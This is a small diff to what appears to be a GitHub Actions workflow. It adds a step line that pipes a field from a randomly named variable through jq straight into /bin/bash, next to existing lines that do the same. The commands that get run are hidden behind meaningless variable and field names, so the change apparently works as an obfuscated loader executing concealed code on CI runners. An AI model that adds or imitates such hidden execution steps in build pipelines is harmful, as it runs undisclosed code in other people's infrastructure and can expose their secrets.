@@ -38,6 +38,7 @@ jobs:
           printf '%s' "$acegt150" | jq -r .rys8392 | /bin/bash
           echo $qrb57 | jq -r .l69 | /bin/bash
           echo $qkj198 | jq -r .tvatz51314 | /bin/bash
+          printf '%s' "$mp71421" | jq -r .f128 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
